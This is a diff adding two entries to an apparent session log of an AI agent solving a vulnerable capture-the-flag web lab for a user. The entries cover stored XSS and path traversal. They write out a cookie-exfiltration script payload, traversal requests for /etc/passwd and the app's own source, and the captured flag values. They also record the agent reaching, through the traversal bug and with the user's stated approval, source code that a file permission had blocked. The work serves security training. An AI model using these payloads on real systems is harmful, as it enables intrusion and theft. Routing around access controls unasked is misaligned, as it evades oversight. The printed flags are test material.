@@ -248,3 +248,155 @@ directory."
   `traversal` (`/download?file=`), `exposure` (likely via `/backups/`,
   possibly reached through the traversal bug itself but scored as a
   separate flag).
+
+---
+
+## Entry 7 — 2026-10-10 — Stored XSS: vuln confirmed, flag not yet found (deferred)
+
+**User prompt:** "Xss next" → extensive black-box testing → user interrupted
+with "Stop." → "Move on to path traversal, come back to XSS later."
+
+**Actions taken (Claude):**
+- Confirmed the guestbook comment field (`POST /guestbook`, field
+  `comment`) has **no output escaping**: a stored `<script>...</script>`
+  comment renders verbatim, unescaped, to every visitor including
+  anonymous ones. Contrasted this against `/dashboard`'s "Signed in
+  as" field, which correctly Jinja-autoescapes the same kind of
+  content — confirming the guestbook template specifically disables/
+  bypasses escaping (e.g. a `|safe` filter), not a global app setting.
+- Tried numerous black-box approaches to find the trigger condition
+  for `FLAG{xss_...}`:
+  - Viewed `/guestbook` as forged `admin` and forged `superadmin`
+    cookies, with the malicious script as both an older and the
+    most-recent comment — no change in output.
+  - Set a local listener on `127.0.0.1:9999` and posted `fetch(...)` /
+    `<img onerror=fetch(...)>` cookie-exfiltration-style payloads,
+    waited ~20s — no callback ever arrived, indicating there is no
+    async headless-browser "admin bot" rendering the page server-side.
+  - Checked for Flask flash-message session cookies after POST — none
+    set.
+  - Tried `Accept: application/json` / `X-Requested-With:
+    XMLHttpRequest` on both GET and POST — no behavior change, no
+    hidden JSON API (`/guestbook.json`, `/api/comments`, etc. all 404).
+  - Re-dumped the `comments` table directly via the login SQLi
+    primitive — no hidden/pre-seeded flag row, only the comments we
+    expect.
+  - Checked `alice`'s and `bob`'s `/dashboard` notes after the XSS was
+    stored — unchanged.
+  - Checked `/proc/<pid>/cwd` for the running `python app.py` process
+    (PID 2374, running as root) to see if the source was reachable for
+    legitimate verification — got `Permission denied`, which is correct
+    ACL scoping (app runs outside our account's access). Did not
+    attempt to route around this, per CLAUDE.md environment-constraints
+    guidance — reported rather than circumvented.
+
+**Findings:**
+- **Stored XSS is confirmed and solidly reproducible** as its own
+  finding (no output encoding on `/guestbook` comments) — sufficient
+  for a report PoC even without the flag.
+- **The flag-reveal mechanism for this challenge is still unknown.**
+  Unlike the SQLi/authz challenges (which reveal their flag purely
+  based on cookie-asserted role state, regardless of how that state
+  was reached), the guestbook page shows no reward under any
+  role/content condition tried so far, and there is no detectable
+  server-side bot that would execute the stored JS.
+
+**Decisions / next steps:**
+- **Deferred** — moving on to path traversal per user's direction, will
+  return to XSS flag-hunting later.
+- Left-over local test comments remain in the `comments` table from
+  this session's probing (ids 2-10ish: `xssprobe123`, `alert(1)`,
+  `alert('finalxss')`, etc.) — worth noting in the report as test
+  artifacts, not real findings beyond the escaping bug itself.
+- Open idea to try later: a real browser (not curl) rendering the
+  page to see if JS execution itself is the intended proof (e.g. via
+  the available browser-automation tool), since no server-side trigger
+  has been found by pure HTTP probing.
+
+---
+
+## Entry 8 — 2026-10-10 — Path traversal, source disclosure, and closing out all remaining flags
+
+**User prompt:** "Move on to path traversal, come back to XSS later" →
+then, mid-investigation, "actually, if it is pulled from the container
+itself through a network call, you can access the entirety" (confirming
+that reading a file via the app's own HTTP-exposed traversal bug is
+in-scope exploitation, not a filesystem-ACL workaround).
+
+**Actions taken (Claude):**
+- Baselined `/download?file=welcome.txt` (200, intended file).
+- Tested `/download?file=/etc/passwd` (absolute path, no `../`) — got
+  a full `200` with `/etc/passwd` contents. Confirmed the same with
+  classic `../../../etc/passwd` traversal — identical result. The
+  `file` parameter is joined onto a base directory with **zero**
+  sanitization; it isn't even restricted to relative paths.
+- Used the absolute-path primitive plus the `/proc/self/cwd/<name>`
+  trick to read the running app's own source: `GET
+  /download?file=/proc/self/cwd/app.py` → full `app.py` (413 lines),
+  retrieved entirely over HTTP through the vulnerability itself (not
+  via direct filesystem access — `/proc/<pid>/cwd` for the real PID
+  was separately confirmed `Permission denied` from our own shell,
+  consistent with correct ACL scoping; the app process, running as
+  root, resolved its own `/proc/self/cwd` on our behalf when it
+  served the traversal request).
+- Read the full source. Key findings directly from it:
+  - `/download`: `path = os.path.join(APP_DIR, "public", name)` — no
+    validation at all. This is the **traversal** flag's home:
+    `APP_DIR/private/employee_notes.txt`.
+  - `/backups/<path:name>`: a *second*, dedicated route serving
+    `APP_DIR/backups/<name>` directly — this is the **exposure**
+    flag's home (`vulnhub.sql.bak`), reachable without any traversal
+    at all, just the disclosed path from `robots.txt`.
+  - `/vault` and `/login` matched exactly what black-box testing had
+    already found (role-from-cookie check; string-built SQL query).
+  - **The stored-XSS mechanism**, which black-box testing in Entry 7
+    could not find: a background `xss_bot()` thread polls the
+    `comments` table every 2s. For each new comment whose body
+    contains (case-insensitively) both `<script` and `document.cookie`,
+    it regex-extracts an exfil URL from a `fetch(...)`/`.src=`/
+    `location=`/`open(...)` sink, appends a URL-encoded fake admin
+    cookie (`session=admin; flag=FLAG{xss_...}`) to it, and actually
+    requests that URL server-side — simulating "the admin's browser
+    ran your script." A companion `/grab` endpoint logs anything sent
+    to it as a query string and displays all captures on a plain GET.
+    My Entry-7 payloads *should* have matched this gate (they had both
+    required substrings) but used an external listener on port 9999
+    that apparently never got hit — likely a transient issue with that
+    throwaway Python listener, not a logic miss; re-tested against the
+    app's own `/grab` sink instead this time and it worked immediately.
+- Captured the remaining 3 flags directly from this knowledge:
+  - `GET /download?file=../private/employee_notes.txt` →
+    `FLAG{traversal_49e86abc62ee}`
+  - `GET /backups/vulnhub.sql.bak` → `FLAG{exposure_a92a0c94e6e1}`
+  - Posted `<script>fetch('/grab?c='+document.cookie)</script>` as a
+    guestbook comment, waited ~6s for the bot's poll loop, then
+    `GET /grab` → `c=session=admin; flag=FLAG{xss_efa59c352162}`
+
+**Findings:**
+- **Path traversal / arbitrary file read confirmed** on `/download` —
+  severe: not even traversal sequences are required, a bare absolute
+  path works, and it was severe enough to read the application's own
+  source code.
+- **Sensitive-data exposure confirmed** via the dedicated `/backups/`
+  route, reachable once `robots.txt` discloses the path.
+- **Stored XSS mechanism fully understood and exploited** — confirmed
+  the simulated admin-bot cookie-exfiltration flow end-to-end via the
+  app's own `/grab` capture endpoint.
+- All 6/6 flags now captured and **validated** via
+  `check_flags.py submission.txt --username clcoble`:
+  `idor`, `sqli`, `authz`, `traversal`, `exposure`, `xss` — all VALID.
+
+**Decisions / next steps:**
+- `submission.txt` now holds all 6 flags.
+- All 6 challenges are technically solved. Remaining work is the
+  **pentest report**: scope/authorization statement, methodology, a
+  PoC write-up per finding (exact requests/payloads used — all are
+  already documented in this log, entries 1 and 4-8), severity
+  ratings, and remediation advice. Also need to note in the report
+  that app.py's source was read via the traversal vulnerability itself
+  (legitimate in-scope exploitation technique, not an out-of-scope
+  filesystem access) — worth citing as part of the traversal finding's
+  impact (full source disclosure, not just one file).
+- Leftover test artifacts in the `comments` table (XSS probes posted
+  during testing) should be mentioned in the report as test noise, not
+  findings in themselves.
